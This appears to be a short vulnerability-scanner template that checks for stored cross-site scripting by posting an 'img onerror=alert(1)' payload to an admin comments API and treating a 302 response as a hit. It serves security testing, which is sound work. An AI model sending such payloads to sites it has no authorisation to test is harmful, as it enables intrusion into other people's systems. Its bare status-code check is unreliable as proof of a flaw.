id: xss-stored
info:
  name: Stored XSS
  author: project-c
  severity: high
requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/admin/comments"
    body: "text=<img src=x onerror=alert(1)>"
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: status
        status:
          - 302
